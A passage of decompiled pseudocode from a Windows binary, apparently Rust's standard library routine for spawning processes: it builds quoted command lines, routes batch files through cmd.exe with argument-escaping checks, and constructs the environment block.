sub_1400330F0((__int64)&lpString1, (char **)&v324);\n      if ( LOBYTE(lpString1.lpTitle) == 2 )\n      {\n        if ( ProcessInformation.m128i_i64[1] )\n          sub_140006340((void *)v224.m128i_i64[0], 1ui64);\n        goto LABEL_432;\n      }\n      if ( lpString1.lpDesktop )\n        break;\n      if ( lpString1.lpReserved )\n        sub_140006340(*(void **)&lpString1.cb, 1ui64);\n    }\n    v334.m256i_i32[7] = HIDWORD(lpString1.lpTitle);\n    *(__int32 *)((char *)&v334.m256i_i32[6] + 1) = *(_DWORD *)((char *)&lpString1.lpTitle + 1);\n    *(_OWORD *)v334.m256i_i8 = *(_OWORD *)&lpString1.cb;\n    v334.m256i_i64[2] = (__int64)lpString1.lpDesktop;\n    v334.m256i_i8[24] = (__int8)lpString1.lpTitle;\n    sub_140035D40((__int64)&v334, (unsigned __int8 *)Src, (unsigned __int64)v88);\n    if ( !(_BYTE)lpCurrentDirectory )\n      sub_140039E30((__int64)&v334, \"exeNUL\\\\cmd.exefallback RNG broken: \", 3ui64);\n    v225 = (void *)v334.m256i_i64[0];\n    sub_140041AA0((__int64)&lpString1, (char *)v334.m256i_i64[0], v334.m256i_i64[2]);\n    if ( v334.m256i_i64[1] )\n      sub_140006340(v225, 1ui64);\n    v127 = *(_QWORD *)&lpString1.cb;\n  }\n  while ( !*(_QWORD *)&lpString1.cb );\n  v128 = _mm_loadu_si128((const __m128i *)&lpString1.lpReserved);\n  if ( ProcessInformation.m128i_i64[1] )\n    sub_140006340((void *)v224.m128i_i64[0], 1ui64);\nLABEL_409:\n  v124 = Src;\nLABEL_410:\n  v89 = (char **)v128.m128i_i64[0];\n  v137 = _mm_shuffle_epi32(v128, 238).m128i_u64[0];\nLABEL_229:\n  *(_QWORD *)&v314 = v127;\n  *((_QWORD *)&v314 + 1) = v89;\n  v315 = (void *)v137;\n  if ( v137 < 5 || *(_WORD *)(v127 + 2 * v137 - 10) != 46 || *(_WORD *)(v127 + 2 * v137 - 2) )\n  {\nLABEL_232:\n    v138 = (char *)v333;\n    v139 = (_QWORD *)*((_QWORD *)v333 + 18);\n    v140 = *((_QWORD *)v333 + 20);\n    v141 = *((_BYTE *)v333 + 173);\n    v334.m256i_i64[0] = 2i64;\n    *(_OWORD *)&v334.m256i_u64[1] = 0i64;\n    sub_14002E170(v334.m256i_i64, 0i64);\n    v142 = v334.m256i_i64[2];\n    *(_WORD *)(v334.m256i_i64[0] + 2 * v334.m256i_i64[2]) = 34;\n    v334.m256i_i64[2] = v142 + 1;\n    *(_QWORD *)&lpString1.cb = v124;\n    lpString1.lpReserved = (LPWSTR)v322;\n    LOWORD(lpString1.lpDesktop) = 0;\n    sub_14002DFF0(v334.m256i_i64, (char **)&lpString1);\n    v143 = v334.m256i_i64[2];\n    if ( v334.m256i_i64[2] == v334.m256i_i64[1] )\n    {\n      sub_14002E170(v334.m256i_i64, v334.m256i_i64[2]);\n      v143 = v334.m256i_i64[2];\n    }\n    *(_WORD *)(v334.m256i_i64[0] + 2 * v143) = 34;\n    v334.m256i_i64[2] = v143 + 1;\n    v144 = &v139[5 * v140];\n    while ( v139 != v144 )\n    {\n      v145 = v334.m256i_i64[2];\n      if ( v334.m256i_i64[2] == v334.m256i_i64[1] )\n      {\n        sub_14002E170(v334.m256i_i64, v334.m256i_i64[2]);\n        v145 = v334.m256i_i64[2];\n      }\n      *(_WORD *)(v334.m256i_i64[0] + 2 * v145) = 32;\n      v334.m256i_i64[2] = v145 + 1;\n      v146 = sub_140041B70(v334.m256i_i64, v139, v141);\n      v139 += 5;\n      if ( v146 )\n      {\n        if ( v334.m256i_i64[1] )\n          sub_140006340((void *)v334.m256i_i64[0], 2ui64);\nLABEL_250:\n        v154 = v328;\n        *(_QWORD *)v328 = v146;\n        *(_QWORD *)(v154 + 16) = 2i64;\nLABEL_251:\n        v155 = 0;\n        goto LABEL_252;\n      }\n    }\n    v146 = (char **)v334.m256i_i64[1];\n    v147 = (WCHAR *)v334.m256i_i64[0];\n    if ( !v334.m256i_i64[0] )\n      goto LABEL_250;\n    v148 = v334.m256i_i64[2];\n    v332.m256i_i64[2] = (__int64)v315;\n    *(_OWORD *)v332.m256i_i8 = v314;\n    LOBYTE(lpDesktop) = 1;\n    LODWORD(v331) = 0;\n    goto LABEL_243;\n  }\n  switch ( *(_WORD *)(v127 + 2 * v137 - 8) )\n  {\n    case 'B':\n    case 'b':\n      if ( (*(unsigned __int16 *)(v127 + 2 * v137 - 6) | 0x20) == 97\n        && (*(unsigned __int16 *)(v127 + 2 * v137 - 4) | 0x20) == 116 )\n      {\n        goto LABEL_265;\n      }\n      if ( *(_WORD *)(v127 + 2 * v137 - 8) != 67 )\n        goto LABEL_232;\nLABEL_263:\n      if ( (*(unsigned __int16 *)(v127 + 2 * v137 - 6) | 0x20) != 109\n        || ((*(_WORD *)(v127 + 2 * v137 - 4) - 68) & 0xFFDF) != 0 )\n      {\n        goto LABEL_232;\n      }\nLABEL_265:\n      v334.m256i_i64[0] = 2i64;\n      *(_OWORD *)&v334.m256i_u64[1] = 0i64;\n      *((_QWORD *)&v158 + 1) = 512i64;\n      v341 = 2i64;\n      Src = 0i64;\n      v159 = 0i64;\n      v160 = 0i64;\n      break;\n    case 'C':\n    case 'c':\n      goto LABEL_263;\n    default:\n      goto LABEL_232;\n  }\n  while ( 2 )\n  {\n    while ( 2 )\n    {\n      v161 = (WCHAR *)&lpString1;\n      v162 = 512i64;\n      v163 = *((_QWORD *)&v158 + 1);\nLABEL_274:\n      SetLastError(0);\n      v165 = GetSystemDirectoryW(v161, v163);\n      if ( !v165 && GetLastError() )\n      {\n        *((_QWORD *)&v158 + 1) = ((unsigned __int64)GetLastError() << 32) | 2;\n        *(_QWORD *)&v158 = 0i64;\n        goto LABEL_486;\n      }\n      *((_QWORD *)&v158 + 1) = v165;\n      if ( v163 == v165 )\n      {\n        if ( GetLastError() != 122 )\n          sub_14005CEC0((__int64)&unk_14006C9D0, 40i64, (__int64)&off_14006BC38);\n        v166 = 2 * v163;\n        if ( v166 >= 0xFFFFFFFF )\n          v166 = 0xFFFFFFFFi64;\n        *((_QWORD *)&v158 + 1) = v166;\n        if ( v166 < 0x201 )\n          continue;\n        goto LABEL_269;\n      }\n      break;\n    }\n    if ( v163 < v165 )\n    {\n      if ( v165 < 0x201ui64 )\n        continue;\nLABEL_269:\n      v164 = *((_QWORD *)&v158 + 1) - v160;\n      if ( (unsigned __int64)&v159[-v160] < v164 )\n      {\n        sub_14005DCD0(v334.m256i_i64, v160, v164);\n        Src = (void *)v334.m256i_i64[1];\n        v341 = v334.m256i_i64[0];\n      }\n      v159 = (char *)Src;\n      v160 = 0xFFFFFFFFi64;\n      if ( (unsigned __int64)Src < 0xFFFFFFFF )\n        v160 = (__int64)Src;\n      v334.m256i_i64[2] = v160;\n      v161 = (WCHAR *)v341;\n      v162 = v160;\n      v163 = v160;\n      goto LABEL_274;\n    }\n    break;\n  }\n  if ( v162 < v165 )\n    sub_14005CE40(v165, v162, (__int64)&off_14006BC50);\n  if ( v165 )\n  {\n    v244 = 2i64 * v165;\n    v245 = sub_1400062B0(v244, 2ui64);\n    if ( !v245 )\n      sub_14005CBB0(2i64, 2i64 * v165);\n    *(_QWORD *)&v158 = v245;\n  }\n  else\n  {\n    *(_QWORD *)&v158 = 2i64;\n    v244 = 0i64;\n  }\n  memmove((void *)v158, v161, v244);\nLABEL_486:\n  if ( Src )\n    sub_140006340((void *)v341, 2ui64);\n  if ( !(_QWORD)v158 )\n  {\n    v261 = *((_QWORD *)&v158 + 1);\n    goto LABEL_540;\n  }\n  *(_OWORD *)v324.m256i_i8 = v158;\n  v324.m256i_i64[2] = *((_QWORD *)&v158 + 1);\n  v252 = \"\\\\cmd.exefallback RNG broken: \";\n  v253 = 0;\n  v254 = 0i64;\n  while ( 2 )\n  {\n    if ( !v252 )\n      goto LABEL_505;\n    if ( (_WORD)v253 )\n    {\n      v255 = 0;\n      LOWORD(v256) = v253;\n      goto LABEL_495;\n    }\n    if ( v252 == \"fallback RNG broken: \" )\n      goto LABEL_505;\n    LOWORD(v256) = (unsigned __int8)*v252;\n    if ( *v252 >= 0 )\n    {\n      ++v252;\n      v255 = 0;\n      goto LABEL_495;\n    }\n    v258 = v256 & 0x1F;\n    v259 = v252[1] & 0x3F;\n    if ( (unsigned __int8)v256 <= 0xDFu )\n    {\n      v252 += 2;\n      LOWORD(v256) = v259 | ((_WORD)v258 << 6);\n      v255 = 0;\n      goto LABEL_495;\n    }\n    v260 = (v259 << 6) | v252[2] & 0x3F;\n    if ( (unsigned __int8)*v252 < 0xF0u )\n    {\n      v252 += 3;\n      v256 = (v258 << 12) | v260;\n      goto LABEL_512;\n    }\n    v256 = ((v256 & 7) << 18) | (v260 << 6) | v252[3] & 0x3F;\n    if ( v256 != 1114112 )\n    {\n      v252 += 4;\nLABEL_512:\n      if ( v256 > 0xFFFF )\n      {\n        v255 = v256 & 0x3FF | 0xDC00;\n        LOWORD(v256) = ((v256 + 16711680) >> 10) | 0xD800;\n      }\n      else\n      {\n        v255 = 0;\n      }\nLABEL_495:\n      if ( *((_QWORD *)&v158 + 1) == v324.m256i_i64[1] )\n      {\n        if ( v252 )\n        {\n          v257 = ((unsigned __int64)(\"\\\\cmd.exefallback RNG broken: \" - v252 + 11) >> 2) - v254 + 1;\n        }\n        else\n        {\n          v253 = v255;\nLABEL_507:\n          v257 = 1 - v254;\n          v255 = v253;\n        }\n        sub_14005DCD0(v324.m256i_i64, *((__int64 *)&v158 + 1), v257 + 1);\n        *(_QWORD *)&v158 = v324.m256i_i64[0];\n      }\n      v253 = v255;\n      goto LABEL_491;\n    }\nLABEL_505:\n    if ( v254 != 1 )\n    {\n      v254 = 1i64;\n      LOWORD(v256) = 0;\n      v252 = 0i64;\n      if ( *((_QWORD *)&v158 + 1) == v324.m256i_i64[1] )\n        goto LABEL_507;\nLABEL_491:\n      *(_WORD *)(v158 + 2i64 * (*((_QWORD *)&v158 + 1))++) = v256;\n      v324.m256i_i64[2] = *((_QWORD *)&v158 + 1);\n      continue;\n    }\n    break;\n  }\n  v261 = v324.m256i_i64[1];\n  if ( !v324.m256i_i64[0] )\n  {\nLABEL_540:\n    v275 = v328;\n    *(_QWORD *)v328 = v261;\n    *(_QWORD *)(v275 + 16) = 2i64;\n    goto LABEL_251;\n  }\n  ProcessInformation = *(__m128i *)v324.m256i_i8;\n  *(_QWORD *)&ProcessInformation_16 = *((_QWORD *)&v158 + 1);\n  v138 = (char *)v333;\n  LOBYTE(v341) = *((_BYTE *)v333 + 173);\n  LOBYTE(Src) = (_BYTE)v341 != 0;\n  v262 = 3i64;\n  if ( (unsigned __int64)&aCmdExeDCWindow[~(unsigned __int64)\"cmd.exe /d /c \\\"Windows file names may not contain `\\\"` or end with `\\\\`\"\n                                        + 18] >> 2 >= 4 )\n    v262 = (unsigned __int64)&aCmdExeDCWindow[~(unsigned __int64)\"cmd.exe /d /c \\\"Windows file names may not contain `\\\"`\"\n                                                                 \" or end with `\\\\`\"\n                                            + 18] >> 2;\n  v263 = 0i64;\n  if ( v262 == 0x3FFFFFFFFFFFFFFFi64 )\n    sub_140006390();\n  LOBYTE(v263) = 1;\n  v264 = 2 * v263;\n  v331 = v314;\n  v327 = v315;\n  v265 = (_QWORD *)*((_QWORD *)v333 + 18);\n  v322 = *((_QWORD *)v333 + 20);\n  v266 = sub_1400062B0(2 * v262 + 2, v264);\n  if ( !v266 )\n    sub_14005CBB0(v264, 2 * v262 + 2);\n  *(_WORD *)v266 = 99;\n  *(_QWORD *)&lpString1.cb = v266;\n  lpString1.lpReserved = (LPWSTR)(v262 + 1);\n  lpString1.lpDesktop = (LPWSTR)1;\n  v267 = \"md.exe /d /c \\\"Windows file names may not contain `\\\"` or end with `\\\\`\";\n  v268 = 1i64;\n  LOWORD(v262) = 0;\n  while ( 2 )\n  {\n    if ( (_WORD)v262 )\n    {\nLABEL_523:\n      v269 = 0;\n      goto LABEL_535;\n    }\n    if ( v267 == \"Windows file names may not contain `\\\"` or end with `\\\\`\" )\n      break;\n    LOWORD(v262) = (unsigned __int8)*v267;\n    if ( *v267 >= 0 )\n    {\n      ++v267;\n      v269 = 0;\n      goto LABEL_535;\n    }\n    v270 = v262 & 0x1F;\n    v271 = v267[1] & 0x3F;\n    if ( (unsigned __int8)v262 <= 0xDFu )\n    {\n      v267 += 2;\n      LOWORD(v262) = v271 | ((_WORD)v270 << 6);\n      v269 = 0;\n      goto LABEL_535;\n    }\n    v272 = (v271 << 6) | v267[2] & 0x3F;\n    if ( (unsigned __int8)*v267 < 0xF0u )\n    {\n      v267 += 3;\n      LODWORD(v262) = (v270 << 12) | v272;\n      goto LABEL_533;\n    }\n    LODWORD(v262) = ((v262 & 7) << 18) | (v272 << 6) | v267[3] & 0x3F;\n    if ( (_DWORD)v262 != 1114112 )\n    {\n      v267 += 4;\nLABEL_533:\n      if ( (unsigned int)v262 <= 0xFFFF )\n        goto LABEL_523;\n      v269 = v262 & 0x3FF | 0xDC00;\n      LOWORD(v262) = ((unsigned int)(v262 + 16711680) >> 10) | 0xD800;\nLABEL_535:\n      if ( (LPWSTR)v268 == lpString1.lpReserved )\n      {\n        sub_14005DCD0(\n          (__int64 *)&lpString1,\n          v268,\n          ((unsigned __int64)(\"cmd.exe /d /c \\\"Windows file names may not contain `\\\"` or end with `\\\\`\" - v267 + 18) >> 2)\n        + 1);\n        v266 = *(char **)&lpString1.cb;\n      }\n      *(_WORD *)&v266[2 * v268++] = v262;\n      lpString1.lpDesktop = (LPWSTR)v268;\n      LOWORD(v262) = v269;\n      v138 = (char *)v333;\n      continue;\n    }\n    break;\n  }\n  v273 = lpString1.lpDesktop;\n  v334.m256i_i64[2] = (__int64)lpString1.lpDesktop;\n  *(__m128i *)v334.m256i_i8 = _mm_loadu_si128((const __m128i *)&lpString1);\n  if ( lpString1.lpDesktop == (LPWSTR)v334.m256i_i64[1] )\n  {\n    sub_14002E170(v334.m256i_i64, (__int64)lpString1.lpDesktop);\n    v274 = v331;\n    v273 = (LPWSTR)v334.m256i_i64[2];\n  }\n  else\n  {\n    v274 = v331;\n  }\n  v276 = v334.m256i_i64[0];\n  *(_WORD *)(v334.m256i_i64[0] + 2i64 * (_QWORD)v273) = 34;\n  v277 = (__int64)v273 + 1;\n  v334.m256i_i64[2] = v277;\n  v278 = 0i64;\n  v279 = &off_14006B1E0;\n  while ( (char *)(2i64 * (_QWORD)v327) != v278 )\n  {\n    v13 = *(_WORD *)&v278[v274] == 34;\n    v278 += 2;\n    if ( v13 )\n      goto LABEL_586;\n  }\n  v280 = (unsigned __int64)v327 - 1;\n  if ( v327 )\n  {\n    v289 = *(_WORD *)(v274 + 2 * v280);\n    if ( v289 == 92 )\n    {\nLABEL_586:\n      if ( v334.m256i_i64[1] )\n        sub_140006340((void *)v334.m256i_i64[0], 2ui64);\n      v300 = v328;\n      *(_QWORD *)v328 = v279;\n      *(_QWORD *)(v300 + 16) = 2i64;\n      if ( ProcessInformation.m128i_i64[1] )\n        sub_140006340((void *)ProcessInformation.m128i_i64[0], 2ui64);\n      goto LABEL_251;\n    }\n    v281 = 0i64;\n    if ( !v289 )\n      v281 = (_WORD *)v274;\n  }\n  else\n  {\n    v281 = 0i64;\n  }\n  if ( v281 )\n    v274 = (__int64)v281;\n  else\n    v280 = (unsigned __int64)v327;\n  v290 = v334.m256i_i64[1];\n  if ( v334.m256i_i64[1] - v277 < v280 )\n  {\n    sub_14005DCD0(v334.m256i_i64, v277, v280);\n    v277 = v334.m256i_i64[2];\n    v290 = v334.m256i_i64[1];\n    v276 = v334.m256i_i64[0];\n  }\n  memmove((void *)(v276 + 2 * v277), (const void *)v274, 2 * v280);\n  v291 = v280 + v277;\n  v334.m256i_i64[2] = v291;\n  if ( v291 == v290 )\n  {\n    sub_14002E170(v334.m256i_i64, v290);\n    v276 = v334.m256i_i64[0];\n    v291 = v334.m256i_i64[2];\n  }\n  *(_WORD *)(v276 + 2 * v291) = 34;\n  v334.m256i_i64[2] = v291 + 1;\n  v292 = &v265[5 * v322];\n  while ( v265 != v292 )\n  {\n    v293 = v334.m256i_i64[2];\n    if ( v334.m256i_i64[2] == v334.m256i_i64[1] )\n    {\n      sub_14002E170(v334.m256i_i64, v334.m256i_i64[2]);\n      v293 = v334.m256i_i64[2];\n    }\n    *(_WORD *)(v334.m256i_i64[0] + 2 * v293) = 32;\n    v334.m256i_i64[2] = v293 + 1;\n    v294 = (char)Src;\n    if ( !(_BYTE)v341 )\n    {\n      v294 = (char)Src;\n      if ( !*v265 )\n      {\n        v295 = v265[1];\n        v296 = v265[3];\n        v297 = 0i64;\n        do\n        {\n          v294 = v296 != v297;\n          if ( v296 == v297 )\n            break;\n          v298 = sub_14000AAA0(*(_BYTE *)(v295 + v297++), (__int64)\"\\t &()[]{}^=;!'+,`~%|<>\", 0x16ui64);\n        }\n        while ( v298 != 1 );\n      }\n    }\n    v299 = sub_140041B70(v334.m256i_i64, v265, v294);\n    v138 = (char *)v333;\n    v279 = (void **)v299;\n    v265 += 5;\n    if ( v299 )\n      goto LABEL_586;\n  }\n  v301 = v334.m256i_i64[2];\n  if ( v334.m256i_i64[2] == v334.m256i_i64[1] )\n  {\n    sub_14002E170(v334.m256i_i64, v334.m256i_i64[2]);\n    v301 = v334.m256i_i64[2];\n  }\n  v147 = (WCHAR *)v334.m256i_i64[0];\n  *(_WORD *)(v334.m256i_i64[0] + 2 * v301) = 34;\n  v148 = v301 + 1;\n  v146 = (char **)v334.m256i_i64[1];\n  *(__m128i *)v332.m256i_i8 = ProcessInformation;\n  v302 = ProcessInformation_16;\n  v332.m256i_i64[2] = ProcessInformation_16;\n  LOBYTE(v302) = 1;\n  LODWORD(v331) = v302;\n  LODWORD(lpDesktop) = 0;\nLABEL_243:\n  v318 = v332.m256i_i64[2];\n  *(__m128i *)lpApplicationName = _mm_load_si128((const __m128i *)&v332);\n  lpCommandLine[0] = v147;\n  lpCommandLine[1] = (LPWSTR)v146;\n  v321 = v148;\n  if ( (char **)v148 == v146 )\n  {\n    v345 = 1;\n    sub_14002E170((__int64 *)lpCommandLine, v148);\n    v147 = lpCommandLine[0];\n    v148 = v321;\n  }\n  v147[v148] = 0;\n  v321 = v148 + 1;\n  v149 = 1544;\n  if ( !v138[172] )\n    v149 = 1024;\n  v150 = *((_DWORD *)v138 + 42) | v149;\n  if ( v311 )\n  {\n    LODWORD(Src) = lpDesktop;\n    v151 = *((_QWORD *)penv + 2);\n    v319.m256i_i64[2] = v151;\n    *(__m128i *)v319.m256i_i8 = _mm_loadu_si128((const __m128i *)penv);\n    v332.m256i_i64[0] = 2i64;\n    *(_OWORD *)&v332.m256i_u64[1] = 0i64;\n    if ( v151 )\n    {\n      v152 = 2i64;\n      v153 = 0i64;\n    }\n    else\n    {\n      v346 = 1;\n      sub_14002E170(v332.m256i_i64, 0i64);\n      v152 = v332.m256i_i64[0];\n      v168 = v332.m256i_i64[2];\n      *(_WORD *)(v332.m256i_i64[0] + 2 * v332.m256i_i64[2]) = 0;\n      v153 = v168 + 1;\n      v332.m256i_i64[2] = v153;\n    }\n    v169 = 0i64;\n    if ( !v319.m256i_i64[0] )\n      v151 = 0i64;\n    LOBYTE(v169) = v319.m256i_i64[0] != 0;\n    *(_QWORD *)&lpString1.cb = v169;\n    lpString1.lpReserved = 0i64;\n    *(_OWORD *)&lpString1.lpDesktop = *(_OWORD *)v319.m256i_i8;\n    *(_OWORD *)&lpString1.dwX = v169;\n    *(_OWORD *)&lpString1.dwXCountChars = *(_OWORD *)v319.m256i_i8;\n    *(_QWORD *)&lpString1.wShowWindow = v151;\nLABEL_292:\n    sub_14003AB10(&v334, &lpString1);\n    if ( v334.m256i_i64[0] )\n    {\n      v170 = *(_BYTE *)(v334.m256i_i64[0] + 32 * v334.m256i_i64[2] + 24);\n      if ( v170 != 2 )\n      {\n        v327 = (LPVOID)v152;\n        penv = *(LPWCH *)(v334.m256i_i64[0] + 56 * v334.m256i_i64[2] + 360);\n        v341 = *(_QWORD *)(v334.m256i_i64[0] + 56 * v334.m256i_i64[2] + 368);\n        v171 = *(_QWORD *)(v334.m256i_i64[0] + 56 * v334.m256i_i64[2] + 376);\n        v172 = *(char **)(v334.m256i_i64[0] + 56 * v334.m256i_i64[2] + 384);\n        v173 = *(_QWORD *)(v334.m256i_i64[0] + 56 * v334.m256i_i64[2] + 392);\n        v174 = *(_QWORD *)(v334.m256i_i64[0] + 56 * v334.m256i_i64[2] + 400);\n        v175 = *(_BYTE *)(v334.m256i_i64[0] + 56 * v334.m256i_i64[2] + 408);\n        v176 = v334.m256i_i64[0] + 32 * v334.m256i_i64[2];\n        v324.m256i_i64[2] = *(_QWORD *)(v176 + 16);\n        *(__m128i *)v324.m256i_i8 = _mm_loadu_si128((const __m128i *)v176);\n        v324.m256i_i8[24] = v170;\n        v177 = *(_DWORD *)(v176 + 25);\n        v324.m256i_i32[7] = *(_DWORD *)(v176 + 28);\n        *(__int32 *)((char *)&v324.m256i_i32[6] + 1) = v177;\n        v178 = (unsigned __int8 *)&v172[v174];\n        v179 = 0;\n        v180 = v172;\n        while ( 1 )\n        {\n          v181 = 1;\n          if ( v179 )\n          {\n            v179 = 0;\n          }\n          else\n          {\n            if ( v180 == (char *)v178 )\n            {\n              v187 = v327;\n              if ( v175 == 2 )\n              {\n                v152 = (__int64)v172;\n                goto LABEL_340;\n              }\n              if ( v173 )\n                sub_140006340(v172, 1ui64);\n              if ( v332.m256i_i64[1] - v153 < v171 )\n              {\n                sub_14005DCD0(v332.m256i_i64, v153, v171);\n                v187 = (_WORD *)v332.m256i_i64[0];\n                v153 = v332.m256i_i64[2];\n              }\n              v188 = penv;\n              memmove(&v187[v153], penv, 2 * v171);\n              v189 = v171 + v153;\n              v332.m256i_i64[2] = v189;\n              if ( v341 )\n                sub_140006340(v188, 2ui64);\n              if ( v189 == v332.m256i_i64[1] )\n              {\n                v344 = 1;\n                sub_14002E170(v332.m256i_i64, v189);\n                v187 = (_WORD *)v332.m256i_i64[0];\n                v189 = v332.m256i_i64[2];\n              }\n              v187[v189] = 61;\n              v332.m256i_i64[2] = v189 + 1;\n              v190 = *(_OWORD *)v324.m256i_i8;\n              v191 = 0;\n              v192 = (char *)v324.m256i_i64[0];\n              while ( 2 )\n              {\n                v193 = 1;\n                if ( v191 )\n                {\n                  v191 = 0;\n                }\n                else\n                {\n                  if ( v192 == (char *)(v324.m256i_i64[0] + v324.m256i_i64[2]) )\n                  {\n                    v334.m256i_i32[7] = v324.m256i_i32[7];\n                    *(__int32 *)((char *)&v334.m256i_i32[6] + 1) = *(__int32 *)((char *)&v324.m256i_i32[6] + 1);\n                    *(_OWORD *)v334.m256i_i8 = *(_OWORD *)v324.m256i_i8;\n                    v334.m256i_i64[2] = v324.m256i_i64[2];\n                    v334.m256i_i8[24] = v170;\n                    ProcessInformation.m128i_i64[0] = v324.m256i_i64[0];\n                    ProcessInformation.m128i_i64[1] = v324.m256i_i64[0] + v324.m256i_i64[2];\n                    LOWORD(ProcessInformation_16) = 0;\n                    sub_14002DFF0(v332.m256i_i64, (char **)&ProcessInformation);\n                    if ( *((_QWORD *)&v190 + 1) )\n                      sub_140006340((void *)v190, 1ui64);\n                    v199 = v332.m256i_i64[2];\n                    if ( v332.m256i_i64[2] == v332.m256i_i64[1] )\n                    {\n                      v344 = 0;\n                      sub_14002E170(v332.m256i_i64, v332.m256i_i64[2]);\n                      v199 = v332.m256i_i64[2];\n                    }\n                    v152 = v332.m256i_i64[0];\n                    *(_WORD *)(v332.m256i_i64[0] + 2 * v199) = 0;\n                    v153 = v199 + 1;\n                    v332.m256i_i64[2] = v153;\n                    goto LABEL_292;\n                  }\n                  LOWORD(v194) = (unsigned __int8)*v192;\n                  if ( *v192 >= 0 )\n                  {\n                    ++v192;\n                    goto LABEL_331;\n                  }\n                  v195 = v194 & 0x1F;\n                  v196 = v192[1] & 0x3F;\n                  if ( (unsigned __int8)v194 <= 0xDFu )\n                  {\n                    v192 += 2;\n                    LOWORD(v194) = v196 | ((_WORD)v195 << 6);\n                    goto LABEL_331;\n                  }\n                  v197 = (v196 << 6) | v192[2] & 0x3F;\n                  if ( (unsigned __int8)*v192 < 0xF0u )\n                  {\n                    v192 += 3;\n                    v194 = (v195 << 12) | v197;\n                  }\n                  else\n                  {\n                    v198 = v192[3];\n                    v192 += 4;\n                    v194 = ((v195 & 7) << 18) | (v197 << 6) | v198 & 0x3F;\n                  }\n                  if ( v194 > 0xFFFF )\n                  {\n                    v191 = v194 & 0x3FF | 0xDC00;\n                  }\n                  else\n                  {\nLABEL_331:\n                    v191 = 0;\n                    v193 = v194;\n                  }\n                }\n                if ( !v193 )\n                {\n                  if ( v324.m256i_i64[1] )\n                    sub_140006340((void *)v324.m256i_i64[0], 1ui64);\n                  v152 = (__int64)&off_14006B650;\n                  goto LABEL_426;\n                }\n                continue;\n              }\n            }\n            LOWORD(v182) = (unsigned __int8)*v180;\n            if ( *v180 < 0 )\n            {\n              v183 = v182 & 0x1F;\n              v184 = v180[1] & 0x3F;\n              if ( (unsigned __int8)v182 <= 0xDFu )\n              {\n                v180 += 2;\n                LOWORD(v182) = v184 | ((_WORD)v183 << 6);\n                v138 = (char *)v333;\n              }\n              else\n              {\n                v185 = (v184 << 6) | v180[2] & 0x3F;\n                if ( (unsigned __int8)*v180 < 0xF0u )\n                {\n                  v180 += 3;\n                  v182 = (v183 << 12) | v185;\n                }\n                else\n                {\n                  v186 = v180[3];\n                  v180 += 4;\n                  v182 = ((v183 & 7) << 18) | (v185 << 6) | v186 & 0x3F;\n                }\n                v138 = (char *)v333;\n                if ( v182 > 0xFFFF )\n                {\n                  v179 = v182 & 0x3FF | 0xDC00;\n                  goto LABEL_296;\n                }\n              }\n            }\n            else\n            {\n              ++v180;\n            }\n            v179 = 0;\n            v181 = v182;\n          }\nLABEL_296:\n          if ( !v181 )\n          {\n            v152 = (__int64)&off_14006B650;\n            if ( v173 )\n              sub_140006340(v172, 1ui64);\nLABEL_340:\n            v200 = penv;\n            v201 = v341;\n            if ( v324.m256i_i64[1] )\n              sub_140006340((void *)v324.m256i_i64[0], 1ui64);\n            if ( v201 )\n              sub_140006340(v200, 2ui64);\nLABEL_426:\n            v346 = 0;\n            sub_140041FF0(&lpString1);\n            if ( v332.m256i_i64[1] )\n              sub_140006340((void *)v332.m256i_i64[0], 2ui64);\n            LOBYTE(lpDesktop) = (_BYTE)Src;\n            goto LABEL_429;\n          }\n        }\n      }\n    }\n    v346 = 0;\n    sub_140041FF0(&lpString1);\n    if ( v153 == v332.m256i_i64[1] )\n    {\n      v346 = 0;\n      sub_14002E170(v332.m256i_i64, v153);\n      v152 = v332.m256i_i64[0];\n      v153 = v332.m256i_i64[2];\n    }\n    *(_WORD *)(v152 + 2 * v153) = 0;\n    v332.m256i_i64[2] = v153 + 1;\n    v156 = v332.m256i_i64[0];\n    v310 = _mm_loadu_si128((const __m128i *)&v332.m256i_u64[1]);\n    LODWORD(lpDesktop) = (_DWORD)Src;\n    if ( !v332.m256i_i64[0] )\n    {\nLABEL_429:\n      v226 = v328;\n      *(_QWORD *)v328 = v152;\n      *(_QWORD *)(v226 + 16) = 2i64;\n      goto LABEL_477;\n    }\n  }\n  else\n  {\n    v310 = 0i64;\n    v156 = 2i64;\n    v152 = 0i64;\n  }\n  *(__m128i *)&v319.m256i_u64[1] = _mm_load_si128(&v310);\n  v319.m256i_i64[0] = v156;\n  if ( v138[136] == 2 )\n  {\n    *(_OWORD *)v324.m256i_i8 = 0i64;\n    v157 = 2i64;\n    lpCurrentDirectory = 0i64;\n    goto LABEL_436;\n  }\n  v203 = (WCHAR *)(*((_QWORD *)v138 + 14) + *((_QWORD *)v138 + 16));\n  v204 = 0;\n  v205 = (char *)*((_QWORD *)v138 + 14);\n  while ( 2 )\n  {\n    v206 = 1;\n    if ( v204 )\n    {\n      v204 = 0;\n      goto LABEL_359;\n    }\n    if ( v205 != (char *)v203 )\n    {\n      LOWORD(v207) = (unsigned __int8)*v205;\n      if ( *v205 >= 0 )\n      {\n        ++v205;\n        goto LABEL_370;\n      }\n      v208 = v207 & 0x1F;\n      v209 = v205[1] & 0x3F;\n      if ( (unsigned __int8)v207 <= 0xDFu )\n      {\n        v205 += 2;\n        LOWORD(v207) = v209 | ((_WORD)v208 << 6);\n        goto LABEL_370;\n      }\n      v210 = (v209 << 6) | v205[2] & 0x3F;\n      if ( (unsigned __int8)*v205 < 0xF0u )\n      {\n        v205 += 3;\n        v207 = (v208 << 12) | v210;\n      }\n      else\n      {\n        v211 = v205[3];\n        v205 += 4;\n        v207 = ((v208 & 7) << 18) | (v210 << 6) | v211 & 0x3F;\n      }\n      if ( v207 > 0xFFFF )\n      {\n        v204 = v207 & 0x3FF | 0xDC00;\n      }\n      else\n      {\nLABEL_370:\n        v204 = 0;\n        v206 = v207;\n      }\nLABEL_359:\n      if ( !v206 )\n      {\n        v222 = v328;\n        *(_QWORD *)v328 = &off_14006B650;\n        *(_QWORD *)(v222 + 16) = 2i64;\n        goto LABEL_475;\n      }\n      continue;\n    }\n    break;\n  }\n  *(_QWORD *)&lpString1.cb = *((_QWORD *)v138 + 14);\n  lpString1.lpReserved = v203;\n  LOWORD(lpString1.lpDesktop) = 0;\n  sub_14003F6F0((__int64)&v334, (char **)&lpString1);\n  v227 = v334.m256i_i64[2];\n  if ( v334.m256i_i64[2] == v334.m256i_i64[1] )\n  {\n    sub_14002E170(v334.m256i_i64, v334.m256i_i64[2]);\n    v227 = v334.m256i_i64[2];\n  }\n  v157 = v334.m256i_i64[0];\n  *(_WORD *)(v334.m256i_i64[0] + 2 * v227) = 0;\n  v334.m256i_i64[2] = v227 